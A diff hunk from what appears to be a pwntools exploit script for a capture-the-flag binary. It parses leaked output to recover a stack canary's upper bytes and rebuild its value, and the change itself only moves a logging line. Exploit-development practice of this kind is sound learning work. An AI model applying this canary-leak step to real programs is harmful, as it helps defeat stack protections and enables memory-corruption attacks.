@@ -108,11 +108,10 @@ try:
         # These should be the 7 MSBs of the canary.
         next_prompt_start_idx_canary = output_s1.index(b"\nWhat's the room number? ", canary_material_start_idx)
         leaked_canary_high_bytes = output_s1[canary_material_start_idx:next_prompt_start_idx_canary]
-        
-        log.info(f"Bytes visibly leaked for canary (len {len(leaked_canary_high_bytes)}): {leaked_canary_high_bytes.hex()}")
 
         if len(leaked_canary_high_bytes) == 13: # Fallback based on previous logs
             log.warning("Only 7 bytes of canary material found.")
+            log.info(f"Bytes visibly leaked for canary : {leaked_canary_high_bytes[0:7].hex()}")
             leaked_canary = u64(b'\x00' + leaked_canary_high_bytes[0:7])
             junk = u64(leaked_canary_high_bytes[7:] + b"\x00\x00")
             log.success(f"Reconstructed canary (LSB=00 + 7B): {hex(leaked_canary)}")
